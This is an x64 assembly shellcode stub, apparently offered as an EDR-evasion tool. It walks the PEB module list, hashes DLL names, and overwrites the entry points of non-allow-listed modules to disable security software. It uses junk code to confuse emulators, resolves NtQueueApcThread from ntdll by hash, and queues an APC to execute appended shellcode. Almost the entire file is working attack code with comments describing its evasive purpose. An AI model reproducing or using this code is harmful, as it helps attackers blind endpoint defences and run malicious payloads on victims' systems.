; .________      .________                   .__          .________
; |   ____/__.__.|   ____/     ___.__.______ |  |__  __ __|   ____/
; |____  <   |  ||____  \     <   |  |\____ \|  |  \|  |  \____  \ 
; /       \___  |/       \     \___  ||  |_> >   Y  \  |  /       \
;/______  / ____/______  /_____/ ____||   __/|___|  /____/______  /
;       \/\/           \/_____/\/     |__|        \/            \/ 

[BITS 64]

evasion_start:
    ; -------------------------------------------------------------------------
    ; Prologue & Context Saving
    ; -------------------------------------------------------------------------
    push rbp                
    push rsi                 
    push rdi                  

    ; -------------------------------------------------------------------------
    ; PEB Access (Process Environment Block)
    ; -------------------------------------------------------------------------
    mov  rdx, qword gs:[60h]  
    mov  rdx, qword [rdx+18h]
    lea  rdx, qword [rdx+20h] 
    push rdx                  
    mov  rdx, qword [rdx]    

    ; -------------------------------------------------------------------------
    ; DLL Enumeration Loop
    ; Walks the linked list of loaded modules to identify targets.
    ; -------------------------------------------------------------------------
dll_loop:
    mov rdx, qword [rdx]      
    cmp rdx, qword [rsp]      
    je  loop_end              
    
    ; Obfuscation / Junk Code
    inc rbp                   
    dec rbp                   
    jz  dummy_jump           

dummy_jump:
    ; -------------------------------------------------------------------------
    ; String Normalization
    ; Reads the DLL name (UNICODE), converts to ASCII, and creates a local copy.
    ; -------------------------------------------------------------------------
    mov   rsi, qword [rdx+50h]   
    movzx rcx, word [rdx+48h]    
    shr   rcx, 1                  
    add   rcx, 8h                
    and   rcx, 0FFFFFFFFFFFFFFF0h
    sub   rsp, rcx                
    mov   r10, rcx                
    xor   rcx, rcx               

convert_loop:
    xor   rax, rax
    lodsw                     
    test  al,  al            
    jz    hash_dll            

    ; -------------------------------------------------------------------------
    ; Obfuscation / Junk Block
    ; Designed to confuse heuristics or emulators looking for tight loops.
    ; -------------------------------------------------------------------------
    test rax, 0x5678          
    nop                       
    
    ; Lowercase Conversion Logic
    cmp  al,  'A'
    jb   save_char            
    cmp  al,  'Z'
    ja   save_char            
    add  al,  32             

save_char:
    mov byte [rsp+rcx], al    
    inc rcx                  
    jmp convert_loop         

    ; -------------------------------------------------------------------------
    ; DLL Identification
    ; Hashes the normalized string and checks if it's a critical system DLL.
    ; -------------------------------------------------------------------------
hash_dll:
    mov  byte [rsp+rcx], 0              
    mov  rsi,            rsp           
    call hash_str                      
    add  rsp,            r10            
    
    ; Check against whitelist because system DLLs we do NOT want to touch
    mov  rsi,            321925C40F3FF70Ah  
    cmp  rsi,            rdi
    je   dll_loop                      
    
    mov  rsi,            4E54E981E6E28B2h  
    cmp  rsi,            rdi
    je   dll_loop                      
    
    mov  rsi,            0C2227BAEE55DEA2Dh
    cmp  rsi,            rdi
    je   dll_loop                       
    
    ; -------------------------------------------------------------------------
    ; EDR Preemption / Clobbering
    ; If we are here, the DLL is unknown (likely EDR). We try to disable it.
    ; -------------------------------------------------------------------------
    call disrupt_routine     
    jmp  zero_return          

disrupt_routine:
    pop rax                   
   
    mov qword [rdx+28h], rax  
    
    ; Junk Code
    xor rbp, rbp
    jmp dll_loop             

    ; -------------------------------------------------------------------------
    ; Injection Phase
    ; Executed once all DLLs have been scanned/clobbered.
    ; -------------------------------------------------------------------------
loop_end:
    pop rdx                  
    
    ; Shim Engine Cleanup
    mov rax,             1111111111111111h
                                           
    mov byte [rax],      0h                

    ; -------------------------------------------------------------------------
    ; PE Parsing (ntdll.dll)
    ; Finding the base of ntdll to resolve exports manually.
    ; -------------------------------------------------------------------------
    mov rdx,             qword [rdx]      
    mov rdx,             qword [rdx]
    mov rdx,             qword [rdx+30h]   
    
    xor rax,             rax
    mov eax,             dword [rdx+3Ch]  
    add rax,             rdx              
    cmp word [rax+0x18], 020Bh             
    jne end_routine                       
    
    ; Access Export Directory
    mov  eax,  dword [rax+88h]             
    add  rax,  rdx                         
    push rax                               
    
    xor  r11,  r11
    mov  r11d, dword [rax+20h]             
    add  r11,  rdx                        
    
    xor  rcx,  rcx
    mov  ecx,  dword [rax+18h]             
    push rcx                             

    ; -------------------------------------------------------------------------
    ; API Resolution Loop
    ; Scans ntdll exports for "NtQueueApcThread"
    ; -------------------------------------------------------------------------
api_hunt:
    test rcx,  rcx
    jz   api_fail                      
    
    xor  rsi,  rsi
    mov  esi,  dword [r11]           
    add  rsi,  rdx                     
    call hash_str                    
    
    add  r11,  4h                     
    dec  rcx                           
    
    mov  rsi,  5D9C96D1D3BF2DF9h      
    cmp  rsi,  rdi                    
    jne  api_hunt                      

    ; API Found: Resolve Address
    pop  rax                          
    inc  ecx                          
    sub  eax,  ecx                    
    xchg eax,  ecx                    
    pop  rax                          
    
    mov  r11d, dword [rax+24h]        
    add  r11,  rdx
    mov  cx,   word [r11+rcx*2]      
    
    mov  r11d, dword [rax+1Ch]         
    add  r11,  rdx
    mov  eax,  dword [r11+rcx*4]      
    add  rax,  rdx                    
    jmp  inject_code

    ; -------------------------------------------------------------------------
    ; Payload Trigger
    ; Uses NtQueueApcThread to execute the shellcode
    ; -------------------------------------------------------------------------
apc_trigger:
    mov  rcx, -2  
    pop  rdx       
                   
    xor  r8,  r8  
    xor  r9,  r9  
    push r9       
    push r9
    sub  rsp, 20h  
    call rax      
    add  rsp, 30h  

end_routine:
    pop rdi
    pop rsi
    pop rbp       
    nop

zero_return:
    xor rax, rax  
    ret

api_fail:
    pop rcx
    pop rax
    jmp end_routine

    ; -------------------------------------------------------------------------
    ; Hashing Function
    ; String hashing to hide API/DLL names from static analysis.
    ; -------------------------------------------------------------------------
hash_str:
    mov rdi, 1337h        

hash_compute:
    xor rax, rax
    lodsb                 
    cmp al,  ah           
    je  hash_finish
    
    ; Hash 
    xor rax, 0x5A         
    rol rdi, 3            
    mov r8,  rdi          
    shl rdi, 6            
    add rdi, r8            
    add rdi, rax         
    jmp hash_compute

hash_finish:
    ret

inject_code:
    call apc_trigger      
                          
                          